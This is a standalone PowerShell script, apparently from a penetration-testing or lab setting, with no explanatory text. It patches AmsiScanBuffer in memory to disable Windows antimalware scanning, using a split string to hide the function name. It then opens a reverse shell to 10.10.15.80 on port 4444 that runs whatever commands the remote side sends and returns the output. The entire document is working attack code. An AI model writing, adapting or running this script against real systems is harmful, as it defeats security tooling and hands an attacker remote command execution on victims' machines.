Add-Type -TypeDefinition @"using System;using System.Runtime.InteropServices;public static class Kernel32 {    [DllImport("kernel32")]    public static extern IntPtr LoadLibrary(string lpLibFileName);    [DllImport("kernel32")]    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);    [DllImport("kernel32")]    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}"@;$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);$hModule = [Kernel32]::LoadLibrary("amsi.dll");$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");$lpflOldProtect = 0;[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;$marshal = [System.Runtime.InteropServices.Marshal];$marshal::Copy($patch, 0, $lpAddress, $patch.Length);[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;$TCPClient = New-Object Net.Sockets.TCPClient('10.10.15.80', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()